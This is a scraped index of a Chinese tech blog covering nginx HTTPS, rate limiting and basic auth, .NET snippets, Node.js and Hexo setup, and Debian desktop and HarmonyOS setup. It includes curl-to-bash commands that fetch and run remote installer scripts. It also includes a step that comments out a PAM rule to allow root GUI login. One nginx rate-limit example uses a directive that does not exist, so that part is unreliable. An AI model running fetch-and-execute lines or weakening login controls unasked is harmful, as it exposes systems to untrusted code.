error:2006D080:BIO routines:BIO_new_file:no such file)：您需要去掉证书相对路径最前面的/。例如，您需要去掉/cert/cert-file-name.pem最前面的/，使用正确的相对路径cert/cert-file-name.pem。\nnginx -s reload 域名443安全组 防火墙开启~ 443 443 443\n.conf 示例\nserver { listen 443 ssl http2; listen [::]:443 ssl http2; server_name www.x.com; ssl_certificate /root/cerf/www.x.com.pem; ssl_certificate_key /root/cerf/www.x.com.key; ssl_protocols TLSv1.2 TLSv1.3; ssl_ciphers HIGH:!aNULL:!MD5; ssl_prefer_server_ciphers on; # HSTS (optional) add_header Strict-Transport-Security \u0026#34;max-age=31536000; includeSubDomains; preload\u0026#34;; # SSL session cache (optional) ssl_session_cache shared:SSL:10m; ssl_session_timeout 10m; # SSL stapling (optional, if you use OCSP) # ssl_stapling on; # ssl_stapling_verify on; # DH param is dependent on certificate size #ssl_dhparam /path/to/dhparam.pem; location / { root /usr/share/nginx/html; index index.html index.htm; } # other locations... # Redirect non-https to https # server { # listen 80; # server_name your.domain.com; # return 301 https://$host$request_uri; # } # Error handling error_page 500 502 503 504 /50x.html; location = /50x.html { root /usr/share/nginx/html; } } 请求次数限制 Nginx 本身并没有默认的请求次数限制，不过它提供了相关模块（如ngx_http_limit_req_module）来帮助设置请求次数限制。以下为详细介绍： 无默认请求次数限制说明 Nginx 是一个高性能的 HTTP 服务器和反向代理服务器，它设计为通用灵活的工具，所以在默认情况下不会对请求次数进行限制。这样的设计允许用户根据自身的具体业务需求和服务器性能来定制请求限制策略。 使用ngx_http_limit_req_module设置请求次数限制 ngx_http_limit_req_module模块可以限制单位时间内的请求数量，防止服务器受到过多请求的冲击。以下是使用该模块设置请求次数限制的示例：\n配置限制区域 首先，需要在http块中定义一个限制区域，用于存储请求的状态信息。\nhttp { # 定义一个名为one的限制区域，每秒钟允许处理10个请求 limit_req_zone $binary_remote_addr zone=one:10m rate=10r/s; server { listen 80; server_name example.com; location / { # 应用名为one的限制区域 limit_req zone=one; # 当请求超过限制时，返回503状态码 limit_req_status 503; # 允许超过限制的请求在队列中等待，最多允许5个请求排队 limit_req_queue 5; # 其他配置... root /var/www/html; index index.html; } } } 配置解释 limit_req_zone $binary_remote_addr zone=one:10m rate=10r/s;： $binary_remote_addr：以客户端的 IP 地址作为限制的依据。 zone=one:10m：定义一个名为one的限制区域，占用 10MB 的内存空间，用于存储客户端的请求状态信息。 rate=10r/s：该限制区域每秒钟最多允许处理 10 个请求。 limit_req zone=one;：在location块中应用名为one的限制区域。 limit_req_status 503;：当请求超过限制时，返回 503 状态码（服务不可用）。 limit_req_queue 5;：允许超过限制的请求在队列中等待，最多允许 5 个请求排队。 sudo nginx -s reload 通过以上步骤，就可以为 Nginx 设置请求次数限制。不同的业务场景可能需要不同的限制策略，可以根据实际情况调整限制区域的参数。\n怎样监控Nginx服务器的性能？ 监控 Nginx 服务器的性能有助于及时发现潜在问题，保障服务器的稳定运行。以下为介绍多种监控 Nginx 服务器性能的方法：\n1. 使用 Nginx 自带的状态模块 Nginx 的ngx_http_stub_status_module模块可以提供基本的服务器状态信息，可以通过以下步骤开启并使用它： 配置 Nginx：在 Nginx 配置文件中添加以下内容： nginx\nserver { listen 80; server_name your_domain.com; location /nginx_status { stub_status on; access_log off; allow 127.0.0.1; # 允许访问的IP地址，可根据需求修改 deny all; } } 重新加载配置：执行以下命令使配置生效：\nsudo nginx -s reload 查看状态信息：在浏览器中访问http://your_domain.com/nginx_status（或者使用curl命令），会看到类似以下的信息： plaintext Active connections: 2 server accepts handled requests 4123 4123 4123 Reading: 0 Writing: 1 Waiting: 1 Active connections：当前活跃的连接数。 accepts：Nginx 已经接受的客户端连接总数。 handled：Nginx 已经处理的客户端连接总数。 requests：Nginx 已经处理的客户端请求总数。 Reading：Nginx 正在读取客户端请求头的连接数。 Writing：Nginx 正在向客户端发送响应的连接数。 Waiting：处于空闲状态的保持活动连接数。\n2. 利用日志分析 Nginx 的访问日志和错误日志包含了大量有用的信息，可以帮助分析服务器的性能和用户行为。 访问日志：默认情况下，Nginx 的访问日志位于/var/log/nginx/access.log。可以使用工具（如awk、grep等）分析日志文件，例如统计不同 HTTP 状态码的请求数量：\ngrep \u0026#39;HTTP/1.1\u0026#34; 200\u0026#39; /var/log/nginx/access.log | wc -l # 统计状态 码为200的请求数量 错误日志：错误日志通常位于/var/log/nginx/error.log，通过查看错误日志可以发现服务器运行过程中出现的错误和异常情况。\n3. 使用第三方监控工具 Prometheus 和 Grafana： Prometheus：是一个开源的系统监控和警报工具包，它可以通过nginx-vts-exporter（用于收集 Nginx 的详细指标）来收集 Nginx 的性能指标。 Grafana：用于可视化这些指标，创建直观的仪表盘。 配置步骤： 安装并配置nginx-vts-exporter，使其能够收集 Nginx 的指标。 配置 Prometheus，让它从nginx-vts-exporter获取数据。 在 Grafana 中添加 Prometheus 作为数据源，并创建仪表盘来展示 Nginx 的性能指标，如请求速率、响应时间等。 Zabbix：是一个企业级的开源监控解决方案，可以监控 Nginx 服务器的各种性能指标，如 CPU 使用率、内存使用率、网络流量等。需要在 Nginx 服务器上安装 Zabbix Agent，并在 Zabbix Server 上配置相应的监控项和触发器。\n4. 系统级监控工具 top 和 htop：top是一个常用的系统监控工具，可以实时显示系统中各个进程的资源使用情况，包括 CPU 使用率、内存使用率等。htop是top的增强版，提供了更直观的界面和更多的功能。 iostat：用于监控磁盘 I/O 的性能，查看磁盘的读写速度、I/O 等待时间等指标。例如，执行iostat -x 1可以每秒显示一次磁盘的详细信息。 netstat 和 ss：netstat可以显示网络连接、路由表、网络接口等信息，而ss是netstat的替代品，性能更好。可以使用它们来监控 Nginx 服务器的网络连接情况，例如查看当前的 TCP 连接数： bash netstat -an | grep :80 | wc -l # 统计端口80的TCP连接数\ndebian 卸载 nginx 在Debian系统中，要卸载nginx，可以使用apt-get命令。以下是具体步骤：\n首先，需要知道nginx是否是通过apt安装的。可以使用以下命令查看已安装的nginx包：\ndpkg -l | grep nginx 如果nginx是通过apt安装的，可以使用apt-get命令来卸载它：\nsudo apt-get remove nginx nginx-common 这将会卸载nginx及其配置文件。\n为了清除所有nginx的配置文件和依赖，可以执行：\nsudo apt-get purge nginx nginx-common 最后，可以运行以下命令来清除无用的包和依赖：\nsudo apt-get autoremove 确保在执行这些步骤之前，已经停止了nginx服务：\nsudo systemctl stop nginx 如果nginx是通过其他方式安装的，比如编译安装，那么需要手动删除nginx或者按照其安装方式来卸载。\n常用的Nginx管理工具： 1. Nginx UI 项目地址: GitHub - Nginx UI https://github.com/0xJacky/nginx-ui 主要特点:\n简化配置: 通过图形化界面简化Nginx的配置过程。 实时监控: 显示Nginx服务器的关键指标，如连接数、请求处理时间等。 易于扩展: 支持插件系统，用户可以根据需求安装额外的功能模块。 高效管理: 集中管理多个Nginx实例。 安全性: 提供多种认证机制，确保数据的安全传输。 兼容性: 支持Docker等容器化平台。\nbash \u0026lt;(curl -L -s https://raw.githubusercontent.com/0xJacky/nginx-ui/master/install.sh) install\nsystemctl start nginx-ui systemctl stop nginx-ui\n2. Nginx Proxy Manager 项目地址: GitHub - Nginx Proxy Manager https://github.com/NginxProxyManager/nginx-proxy-manager 官方网站: Nginx Proxy Manager\n主要特点:\n美观和安全的管理界面: 提供直观的用户界面，方便管理和配置。 轻松创建转发和重定向: 支持自定义SSL证书。 高级Nginx配置: 提供高级配置选项。 用户管理权限和审计日志: 支持多用户管理和日志记录。 Docker支持: 提供预构建的Docker镜像，方便部署\nNginx Pwd sudo apt update \u0026amp;\u0026amp; sudo apt install apache2-utils -y 1. 环境准备与文件创建​​ ​​创建项目目录​​\nmkdir nginx-auth-test \u0026amp;\u0026amp; cd nginx-auth-test ​​生成密码文件​​使用 htpasswd创建用户凭证（需安装 apache2-utils）：\nhtpasswd -c .htpasswd testuser # 按提示输入密码 ​​ 注意​​：-c参数仅用于首次创建文件；添加用户时去掉 -c避免覆盖。\n​​2. 配置 Nginx​​ 创建 nginx.conf文件，启用基础认证：\n# nginx.conf server { listen 80; server_name localhost; location / { auth_basic \u0026#34;Restricted Access\u0026#34;; # 认证提示语 auth_basic_user_file /etc/nginx/.htpasswd; # 密码文件路径 root /usr/share/nginx/html; index index.html; } } 此配置要求访问任何路径时输入用户名和密码。\n​​3. 构建 Docker 镜像与运行容器​​ ​​编写 Dockerfile​​\nFROM nginx:alpine COPY nginx.conf /etc/nginx/conf.d/default.conf # 复制配置文件 COPY .htpasswd /etc/nginx/.htpasswd # 复制密码文件 ```bash ​​构建镜像并启动容器​​ ```bash docker build -t nginx-auth . # 构建镜像 docker run -d -p 8080:80 --name auth-test nginx-auth # 后台运行容器 ​​关键点​​： 端口映射 -p 8080:80将容器 80 端口暴露到宿主机 8080。 密码文件需通过 COPY指令放入容器，避免运行时挂载复杂度。\n​​4. 验证密码访问​​ 访问 http://localhost:8080，浏览器弹出认证对话框。 输入用户名 testuser和设置的密码，通过后显示 Nginx 默认页面。 若认证失败，返回 ​​401 Unauthorized​​ 错误。\n​​5. 高级配置与优化​​ ​​多用户管理​​：\nhtpasswd .htpasswd another_user # 追加新用户 ​​Docker Compose 部署​​：\nversion: \u0026#39;3\u0026#39; services: nginx: image: nginx:alpine ports: [\u0026#34;8080:80\u0026#34;] volumes: - ./nginx.conf:/etc/nginx/conf.d/default.conf - ./.htpasswd:/etc/nginx/.htpasswd # 挂载动态更新文件 通过卷（volumes）挂载配置文件，修改后无需重建镜像。 ​​性能优化​​：频繁认证场景下，可将凭证存储至 Redis 减少磁盘 I/O。\n​​注意事项​​ ​​密码安全​​：避免弱密码，生产环境建议使用 TLS 加密（HTTPS）。 ​​文件权限​​：确保 .htpasswd文件权限为 644，防止未授权读取。 ​​容器清理​​：\ndocker stop auth-test \u0026amp;\u0026amp; docker rm auth-test # 停止并删除容器 通过以上步骤，即可快速实现 Docker 下 Nginx 站点的密码保护。 测试环境验证后，可根据需求扩展 SSL 证书、多服务集成等\n","permalink":"https://qfsyso.github.io/posts/debian-nginx-https/","summary":"debian安装 nginx 在Debian系统上安装Nginx，可以按照以下步骤操作：\n如果 sudo: command not found\napt-get install sudo 首先，更新的包索引：\nsudo apt update 接下来，安装Nginx：\nsudo apt install nginx 安装完成后，启动Nginx服务：\nsudo systemctl start nginx （可选）设置Nginx开机自启动：\nsudo systemctl enable nginx 可以通过运行以下命令来检查Nginx的状态：\nsudo systemctl status nginx 现在，可以在Web浏览器中输入服务器的IP地址或域名来访问默认的Nginx欢迎页面。如果是在本地安装的Nginx，可以通过访问 http://localhost 来查看这个页面。\n如果需要配置Nginx，可以编辑 /etc/nginx/nginx.conf 文件或者在 /etc/nginx/sites-available/ 目录下创建或编辑配置文件，并使用 sudo ln -s /etc/nginx/sites-available/your-config /etc/nginx/sites-enabled/ 命令来启用它。\nsudo whereis nginx Nginx 默认安装位置 配置文件所在目录 /etc/\nnginx配置 检测Nginx配置文件是否正确\nnginx -t 重载Nginx配置\nnginx -s reload 自定义Nginx站点配置文件存放目录 /etc/nginx/conf.d/\nnginx网站目录 /var/www/\n域名证书\n阿里云证书 免费证书 https://help.","title":"Debian nginx https"},{"content":"在.NET 控制台应用程序中，你可以使用System.Diagnostics命名空间下的Process类来获取当前进程的内存使用情况。以下是一个简单的示例代码，展示如何获取并显示当前进程的内存使用量：\nusing System; using System.Diagnostics; namespace DisplayProcessMemory { class Program { static void Main(string[] args) { // 获取当前进程 Process currentProcess = Process.GetCurrentProcess(); // 使用需要的内存量 long workingSet64 = currentProcess.WorkingSet64; // 显示内存使用量 Console.WriteLine($\u0026#34;当前进程占用内存: {workingSet64} 字节\u0026#34;); // 单位转换为兆字节 double memoryInMB = workingSet64 / 1024.0 / 1024.0; Console.WriteLine($\u0026#34;当前进程占用内存: {memoryInMB.ToString(\u0026#34;F2\u0026#34;)} MB\u0026#34;); } } } 在.NET中，可以使用System.Diagnostics命名空间下的Process类来获取当前进程的信息，但是直接获取网络带宽使用情况不是Process类提供的功能。你可以使用System.Net.NetworkInformation命名空间下的IPGlobalProperties类来获取网络接口的信息，然后累计所有网络接口的传输数据量来估算带宽使用。\n以下是一个简单的示例代码，用于显示当前进程的网络传输数据量（发送和接收）：\nusing System; using System.Diagnostics; using System.Net.NetworkInformation; class Program { static void Main() { Process currentProcess = Process.GetCurrentProcess(); Console.WriteLine($\u0026#34;Process ID: {currentProcess.Id}\u0026#34;); IPGlobalProperties ipProperties = IPGlobalProperties.GetIPGlobalProperties(); TcpStatistics tcpStats = ipProperties.GetTcpIPv4Statistics(); Console.WriteLine($\u0026#34;Total bytes received: {tcpStats.BytesReceived}\u0026#34;); Console.WriteLine($\u0026#34;Total bytes sent: {tcpStats.BytesSent}\u0026#34;); // 输出网络接口统计信息 NetworkInterface[] networkInterfaces = NetworkInterface.GetAllNetworkInterfaces(); foreach (NetworkInterface networkInterface in networkInterfaces) { Console.WriteLine($\u0026#34;Interface: {networkInterface.Name}\u0026#34;); Console.WriteLine($\u0026#34;Bytes received: {networkInterface.GetIPv4Statistics().BytesReceived}\u0026#34;); Console.WriteLine($\u0026#34;Bytes sent: {networkInterface.GetIPv4Statistics().BytesSent}\u0026#34;); } } } 请注意，这个示例显示的是从系统启动以来累计的网络接口数据量。如果你需要监测特定时间段内的带宽使用情况，你需要定期获取数据并计算差值。另外，这个示例仅包括了IPv4的数据，如果需要IPv6或者更多细节，请相应地扩展代码。\n","permalink":"https://qfsyso.github.io/posts/.net%E8%8E%B7%E5%8F%96%E5%86%85%E5%AD%98/","summary":"在.NET 控制台应用程序中，你可以使用System.Diagnostics命名空间下的Process类来获取当前进程的内存使用情况。以下是一个简单的示例代码，展示如何获取并显示当前进程的内存使用量：\nusing System; using System.Diagnostics; namespace DisplayProcessMemory { class Program { static void Main(string[] args) { // 获取当前进程 Process currentProcess = Process.GetCurrentProcess(); // 使用需要的内存量 long workingSet64 = currentProcess.WorkingSet64; // 显示内存使用量 Console.WriteLine($\u0026#34;当前进程占用内存: {workingSet64} 字节\u0026#34;); // 单位转换为兆字节 double memoryInMB = workingSet64 / 1024.0 / 1024.0; Console.WriteLine($\u0026#34;当前进程占用内存: {memoryInMB.ToString(\u0026#34;F2\u0026#34;)} MB\u0026#34;); } } } 在.NET中，可以使用System.Diagnostics命名空间下的Process类来获取当前进程的信息，但是直接获取网络带宽使用情况不是Process类提供的功能。你可以使用System.Net.NetworkInformation命名空间下的IPGlobalProperties类来获取网络接口的信息，然后累计所有网络接口的传输数据量来估算带宽使用。\n以下是一个简单的示例代码，用于显示当前进程的网络传输数据量（发送和接收）：\nusing System; using System.Diagnostics; using System.Net.NetworkInformation; class Program { static void Main() { Process currentProcess = Process.GetCurrentProcess(); Console.WriteLine($\u0026#34;Process ID: {currentProcess.","title":" .NET获取内存"},{"content":"Debian Nodejs HEXO\n安装Node.js环境 sudo apt update debian安装最新node v20.12.0 在Debian系统上安装特定版本的Node.js（例如v20.12.0），你可以使用NodeSource二进制分发。以下是安装v20.12.0的步骤：\n首先，打开终端。\n使用curl下载NodeSource的安装脚本：\ncurl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash - 安装Node.js：\nsudo apt-get install -y nodejs 验证Node.js是否安装成功：\nnode --version 如果你想要确保安装了特定的v20.12.0版本，可以在安装完Node.js后运行以下命令来验证版本：\nnode -v 如果显示的版本号是v20.12.0，则表示已经成功安装了该版本。\n安装HEXO 使用npm包管理器，直接安装hexo\nnpm install hexo -g hexo init blog cd blog npm install hexo server hexo 修改端口号 _config.yml # 或者使用 vim _config.yml\nDocs: https://hexo.io/docs/server.html server: port: 12311 # 修改这里为你想要的端口号 compress: true header: true hexo s ","permalink":"https://qfsyso.github.io/posts/debian-nodejs-hexo/","summary":"Debian Nodejs HEXO\n安装Node.js环境 sudo apt update debian安装最新node v20.12.0 在Debian系统上安装特定版本的Node.js（例如v20.12.0），你可以使用NodeSource二进制分发。以下是安装v20.12.0的步骤：\n首先，打开终端。\n使用curl下载NodeSource的安装脚本：\ncurl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash - 安装Node.js：\nsudo apt-get install -y nodejs 验证Node.js是否安装成功：\nnode --version 如果你想要确保安装了特定的v20.12.0版本，可以在安装完Node.js后运行以下命令来验证版本：\nnode -v 如果显示的版本号是v20.12.0，则表示已经成功安装了该版本。\n安装HEXO 使用npm包管理器，直接安装hexo\nnpm install hexo -g hexo init blog cd blog npm install hexo server hexo 修改端口号 _config.yml # 或者使用 vim _config.yml\nDocs: https://hexo.io/docs/server.html server: port: 12311 # 修改这里为你想要的端口号 compress: true header: true hexo s ","title":"Debian Nodejs HEXO "},{"content":"DotNetty是微软的Azure团队，使用C#实现的Netty的版本发布。不但使用了C#和.Net平台的技术特点，并且保留了Netty原来绝大部分的编程接口。让我们在使用时，完全可以依照Netty官方的教程来学习和使用DotNetty应用程序。\nNetty 是一个异步事件驱动的网络应用程序框架，用于快速开发可维护的高性能协议服务器和客户端。\n优点 关注点分离——业务和网络逻辑解耦； 模块化和可复用性； 可测试性作为首要的要求 历史 阻塞Socket通信特点：\n建立连接要阻塞线程，读取数据要阻塞线程 如果要管理多个客户端，就需要为每个客户端建立不同的线程 会有大量的线程在休眠状态，等待接收数据，资源浪费 每个线程都要占用系统资源 线程的切换很耗费系统资源 非阻塞Socket（NIO）特点： 每个Socket如果需要读写操作，都通过事件通知的方式通知选择器，这样就实现了一个线程管理多个Socket的目的。 ​\n选择器甚至可以在所有的Socket空闲的时候允许线程先去干别的事情 减少了线程数量导致的资源占用，减少了线程切换导致的资源消耗\nProtobuf wakeng\n","permalink":"https://qfsyso.github.io/posts/.net-netty-proto/","summary":"DotNetty是微软的Azure团队，使用C#实现的Netty的版本发布。不但使用了C#和.Net平台的技术特点，并且保留了Netty原来绝大部分的编程接口。让我们在使用时，完全可以依照Netty官方的教程来学习和使用DotNetty应用程序。\nNetty 是一个异步事件驱动的网络应用程序框架，用于快速开发可维护的高性能协议服务器和客户端。\n优点 关注点分离——业务和网络逻辑解耦； 模块化和可复用性； 可测试性作为首要的要求 历史 阻塞Socket通信特点：\n建立连接要阻塞线程，读取数据要阻塞线程 如果要管理多个客户端，就需要为每个客户端建立不同的线程 会有大量的线程在休眠状态，等待接收数据，资源浪费 每个线程都要占用系统资源 线程的切换很耗费系统资源 非阻塞Socket（NIO）特点： 每个Socket如果需要读写操作，都通过事件通知的方式通知选择器，这样就实现了一个线程管理多个Socket的目的。 ​\n选择器甚至可以在所有的Socket空闲的时候允许线程先去干别的事情 减少了线程数量导致的资源占用，减少了线程切换导致的资源消耗\nProtobuf wakeng","title":" .NET netty proto"},{"content":"🌱PING 地址/主机名/域名\n/// \u0026lt;summary\u0026gt; /// PING /// \u0026lt;/summary\u0026gt; /// \u0026lt;param name=\u0026#34;ip\u0026#34;\u0026gt;ip\u0026lt;/param\u0026gt; /// \u0026lt;returns\u0026gt;\u0026lt;/returns\u0026gt; public static bool PingIp(string ip) { System.Net.NetworkInformation.Ping p = new System.Net.NetworkInformation.Ping(); System.Net.NetworkInformation.PingOptions options = new System.Net.NetworkInformation.PingOptions(); options.DontFragment = true; string data = \u0026#34;Test Data!\u0026#34;; byte[] buffer = Encoding.ASCII.GetBytes(data); int timeout = 2000; // Timeout System.Net.NetworkInformation.PingReply reply = p.Send(ip, timeout, buffer, options); if (reply.Status == System.Net.NetworkInformation.IPStatus.Success) { // AddToConvo(ip + reply.Status); return true; } else { // AddToConvo(ip + reply.Status); return false; } } 👀调用方法\nList\u0026lt;string\u0026gt; list = new List\u0026lt;string\u0026gt;(); list.Add(\u0026#34;192.168.1.1\u0026#34;); list.Add(\u0026#34;192.168.3.1\u0026#34;); list.Add(\u0026#34;192.168.4.1\u0026#34;); foreach (string s in list) { Console.WriteLine(s+\u0026#34; \u0026#34;+ ccPing.PingIp(s)); //if(!xxx) } Thread.Sleep(10000); ​\n隔10秒自动调用1次 📫检查URL\npublic async Task\u0026lt;bool\u0026gt; IsServerRespondingAsync(string url, TimeSpan timeout) { try { using (var cancellationTokenSource = new System.Threading.CancellationTokenSource()) { cancellationTokenSource.CancelAfter(timeout); var response = await _httpClient.GetAsync(url, cancellationTokenSource.Token); return response.IsSuccessStatusCode; } } catch (TaskCanceledException) { // 请求超时 return false; } catch (Exception) { // 发生其他错误 return false; } } ``` ⚡异步调用 ``` C# await checker.IsServerRespondingAsync(url, TimeSpan.FromSeconds(2)); 如果False可以调用报警代码\nEND\n​\n","permalink":"https://qfsyso.github.io/posts/.net-%E6%A3%80%E6%B5%8B%E5%9C%B0%E5%9D%80/%E4%B8%BB%E6%9C%BA/%E5%9F%9F%E5%90%8D%E6%98%AF%E5%90%A6%E6%AD%A3%E5%B8%B8/","summary":"🌱PING 地址/主机名/域名\n/// \u0026lt;summary\u0026gt; /// PING /// \u0026lt;/summary\u0026gt; /// \u0026lt;param name=\u0026#34;ip\u0026#34;\u0026gt;ip\u0026lt;/param\u0026gt; /// \u0026lt;returns\u0026gt;\u0026lt;/returns\u0026gt; public static bool PingIp(string ip) { System.Net.NetworkInformation.Ping p = new System.Net.NetworkInformation.Ping(); System.Net.NetworkInformation.PingOptions options = new System.Net.NetworkInformation.PingOptions(); options.DontFragment = true; string data = \u0026#34;Test Data!\u0026#34;; byte[] buffer = Encoding.ASCII.GetBytes(data); int timeout = 2000; // Timeout System.Net.NetworkInformation.PingReply reply = p.Send(ip, timeout, buffer, options); if (reply.Status == System.Net.NetworkInformation.IPStatus.Success) { // AddToConvo(ip + reply.Status); return true; } else { // AddToConvo(ip + reply.","title":".NET 检测地址/主机/域名是否正常"},{"content":"环境WIN10 VS2022 debian\n👻前言 Avalonia 是一个用于创建跨平台用户界面 (UI) 的开源框架。它是一个基于 .NET 平台的框架，允许开发者使用 XAML 和 C#（F#）来构建跨平台的应用程序。Avalonia 的目标是提供与 Windows Presentation Foundation (WPF) 类似的开发体验，但能够在 Windows、macOS 和 Linux 等多个平台上运行。\n使用 Avalonia，开发者可以创建各种类型的应用程序，包括桌面应用、移动应用和嵌入式应用。一些可以通过 Avalonia 实现的功能和应用包括：\n桌面应用程序：如办公软件、IDE、游戏客户端等。\n移动应用程序：通过 Avalonia 可以构建支持多个平台的移动应用，如 Windows、macOS 和 Linux 上的移动应用。\n跨平台工具：Avalonia 可以用于构建跨平台的开发工具、实用工具等。\n游戏开发：Avalonia 也可以用于构建游戏的用户界面，适合基于 .NET 平台的游戏开发。\nAvalonia 提供了一个强大的工具集，使开发者能够创建具有各种功能和样式的跨平台应用程序。\n💻安装Avalonia 选择管理拓展，点击下载，安装\n​\n​\n📦创建项目 ​\n​\n​\n编码\u0026hellip;\n📚在win下运行 ​\n查看linux内核\nuname -a\n​\n🔑打包发布 复制到linux\n授予权限\n📻在linux下运行 迁移Socket发布到linux ​\n​\n实现win linux web 基于socket实时聊天\n","permalink":"https://qfsyso.github.io/posts/.net-avalonia-linux/","summary":"环境WIN10 VS2022 debian\n👻前言 Avalonia 是一个用于创建跨平台用户界面 (UI) 的开源框架。它是一个基于 .NET 平台的框架，允许开发者使用 XAML 和 C#（F#）来构建跨平台的应用程序。Avalonia 的目标是提供与 Windows Presentation Foundation (WPF) 类似的开发体验，但能够在 Windows、macOS 和 Linux 等多个平台上运行。\n使用 Avalonia，开发者可以创建各种类型的应用程序，包括桌面应用、移动应用和嵌入式应用。一些可以通过 Avalonia 实现的功能和应用包括：\n桌面应用程序：如办公软件、IDE、游戏客户端等。\n移动应用程序：通过 Avalonia 可以构建支持多个平台的移动应用，如 Windows、macOS 和 Linux 上的移动应用。\n跨平台工具：Avalonia 可以用于构建跨平台的开发工具、实用工具等。\n游戏开发：Avalonia 也可以用于构建游戏的用户界面，适合基于 .NET 平台的游戏开发。\nAvalonia 提供了一个强大的工具集，使开发者能够创建具有各种功能和样式的跨平台应用程序。\n💻安装Avalonia 选择管理拓展，点击下载，安装\n​\n​\n📦创建项目 ​\n​\n​\n编码\u0026hellip;\n📚在win下运行 ​\n查看linux内核\nuname -a\n​\n🔑打包发布 复制到linux\n授予权限\n📻在linux下运行 迁移Socket发布到linux ​\n​\n实现win linux web 基于socket实时聊天","title":".NET Avalonia Linux "},{"content":"debian gnome-desktop\n🌞更新 sudo apt update sudo apt -y upgrade ​\n🎨安装 sudo apt -y install task-gnome-desktop 这个过程比较久\n​\n🍎分配 sudo systemctl set-default graphical.target vi /etc/pam.d/gdm-password ``` bash 注释 auth required pam_succeed_if.so user != root quiet_success ``` bash #auth required pam_succeed_if.so user != root quiet_success 🛋️重启 sudo reboot 🔑通过VNC连接 ​\n配置后\n​\n","permalink":"https://qfsyso.github.io/posts/debian-gnome-desktop-gui/","summary":"debian gnome-desktop\n🌞更新 sudo apt update sudo apt -y upgrade ​\n🎨安装 sudo apt -y install task-gnome-desktop 这个过程比较久\n​\n🍎分配 sudo systemctl set-default graphical.target vi /etc/pam.d/gdm-password ``` bash 注释 auth required pam_succeed_if.so user != root quiet_success ``` bash #auth required pam_succeed_if.so user != root quiet_success 🛋️重启 sudo reboot 🔑通过VNC连接 ​\n配置后\n​","title":"Debian Gnome-Desktop GUI "},{"content":"💡 环境搭建 HarmonyOS开发环境搭建\nDevEco Studio安装 https://developer.huawei.com/consumer/cn/deveco-studio/\n​\n🚀安装nodejs ​\n🤵安装ohpm ​\n🍔安装SDK ​\n​\n💥Emulator安装 ​\nQ:The graphic card OpenGL version is too old for Previewer to work..\n解决方法分两步：\n1、下载enGL库：https://github.com/pal1000/mesa-dist-win/releases/download/23.1.1/mesa3d-23.1.1-release-msvc.7z\n2、解压下载的zip文件,双击执行systemwidedeploy.cmd文件，然后按任意键，出现一个菜单，选择1，然后开始安装OpenGL驱动，出现complete 后关闭终端，重新运行程序即可生效。\n🌶️新建ArkTs项目 ​\n​\n​\nentry：HarmonyOS工程模块，编译构建生成一个HAP包。\nsrc \u0026gt; main \u0026gt; ets：用于存放ets源码。 src \u0026gt; main \u0026gt; ets \u0026gt; MainAbility：应用/服务的入口。 src \u0026gt; main \u0026gt; ets \u0026gt; MainAbility \u0026gt; pages：MainAbility包含的页面。 src \u0026gt; main \u0026gt; ets \u0026gt; MainAbility \u0026gt; pages \u0026gt; index.ets：pages列表中的第一个页面，即应用的首页入口。 src \u0026gt; main \u0026gt; ets \u0026gt; MainAbility \u0026gt; app.ets：承载Ability生命周期。 src \u0026gt; main \u0026gt; resources：用于存放应用/服务所用到的资源文件，如图形、多媒体、字符串、布局文件等。 src \u0026gt; main \u0026gt; config.json：模块配置文件。主要包含HAP包的配置信息、应用/服务在具体设备上的配置信息以及应用/服务的全局配置信息。 build-profile.json5：当前的模块信息、编译信息配置项，包括buildOption、targets配置等。其中targets中可配置当前运行环境，默认为HarmonyOS。 hvigorfile.ts：模块级编译构建任务脚本，开发者可以自定义相关任务和代码实现。 build-profile.json5：应用级配置信息，包括签名、产品配置等。\nhvigorfile.ts：应用级编译构建任务脚本。\n​\n🏆️ArkTS语言 ArkTS是HarmonyOS优选的主力应用开发语言。\nArkTS围绕应用开发在TypeScript（简称TS）生态基础上做了进一步扩展，继承了TS的所有特性，是TS的超集。因此，在学习ArkTS语言之前，建议开发者具备TS语言开发能力。\n基本语法：ArkTS定义了声明式UI描述、自定义组件和动态扩展UI元素的能力，再配合ArkUI开发框架中的系统组件及其相关的事件方法、属性方法等共同构成了UI开发的主体。 状态管理：ArkTS提供了多维度的状态管理机制。在UI开发框架中，与UI相关联的数据可以在组件 内使用，也可以在不同组件层级间传递，比如父子组件之间、爷孙组件之间，还可以在应用全局范 围内传递或跨设备传递。另外，从数据的传递形式来看，可分为只读的单向传递和可变更的双向传 递。开发者可以灵活地利用这些能力来实现数据和UI的联动。 渲染控制：ArkTS提供了渲染控制的能力。条件渲染可根据应用的不同状态，渲染对应状态下的UI 内容。循环渲染可从数据源中迭代获取数据，并在每次迭代过程中创建相应的组件。数据懒加载从 数据源中按需迭代数据，并在每次迭代过程中创建相应的组件。 未来，ArkTS会结合应用开发/运行的需求持续演进，逐步提供并行和并发能力增强、系统类型增强、分布式开发范式等更多特性。\n✨️基本语法 基本语法概述 在初步了解了ArkTS语言之后，我们以一个具体的示例来说明ArkTS的基本组成。 装饰器： 用于装饰类、结构、方法以及变量，并赋予其特殊的含义。如上述示例中@Entry、 @Component和@State都是装饰器，@Component表示自定义组件，@Entry表示该自定义组件 为入口组件，@State表示组件中的状态变量，状态变量变化会触发UI刷新。 UI描述：以声明式的方式来描述UI的结构，例如build()方法中的代码块。 自定义组件：可复用的UI单元，可组合其他组件，如上述被@Component装饰的struct Hello。 系统组件：ArkUI框架中默认内置的基础和容器组件，可直接被开发者调用，比如示例中的 Column、Text、Divider、Button。 属性方法：组件可以通过链式调用配置多项属性，如fontSize()、width()、height()、 backgroundColor()等。 事件方法：组件可以通过链式调用设置多个事件的响应逻辑，如跟随在Button后面的onClick()。 系统组件、属性方法、事件方法具体使用可参考基于ArkTS的声明式开发范式。 除此之外，ArkTS扩展了多种语法范式来使开发更加便捷：\n@Builder/@BuilderParam：特殊的封装UI描述的方法，细粒度的封装和复用UI描述。 @Extend/@Styles：扩展内置组件和封装属性样式，更灵活地组合内置组件。 stateStyles：多态样式，可以依据组件的内部状态的不同，设置不同样式。\n🥇 声明式UI描述 ArkTS以声明方式组合和扩展组件来描述应用程序的UI，同时还提供了基本的属性、事件和子组件配置方法，帮助我们实现应用交互逻辑。 创建组件 根据组件构造方法的不同，创建组件包含有参数和无参数两种方式。 无参数 如果组件的接口定义没有包含必选构造参数，则组件后面的“()”不需要配置任何内容。例如，Divider组件不包含构造参数\nColumn() { Text(\u0026#39;item 1\u0026#39;) Divider() Text(\u0026#39;item 2\u0026#39;) } 有参数 如果组件的接口定义包含构造参数，则在组件后面的“()”配置相应参数。 